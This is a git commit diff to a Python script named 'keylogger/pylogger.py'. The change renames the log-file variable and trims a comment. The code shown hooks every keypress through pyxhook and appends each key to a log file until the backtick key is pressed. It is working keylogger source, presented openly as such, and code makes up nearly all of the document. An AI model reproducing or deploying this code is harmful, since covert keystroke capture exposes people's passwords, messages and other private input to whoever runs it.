2b32ea4050000260080cc304baab2a37dc382c93
Rigved Tummala <tummalarr@gmail.com>
2017-08-10 13:21:13 -0400

    Update pylogger.py

--- [linux] keylogger/pylogger.py
+++ [linux] keylogger/pylogger.py
@@ -1,14 +1,15 @@
 import pyxhook
+
+keyfile='/home/pylay/[linux] keylogger/file.log'
 #change this to your log file's path
-log_file='/home/pylay/[linux] keylogger/file.log'
 
 
 def OnKeyPress(event):
-  fob=open(log_file,'a')
+  fob=open(keyfile,'a')
   fob.write(event.Key)
   fob.write('\n')
 
-  if event.Ascii==96: #96 is ascii value of (`) key
+  if event.Ascii==96: #96 = ascii (`)
     fob.close()
     new_hook.cancel()
 
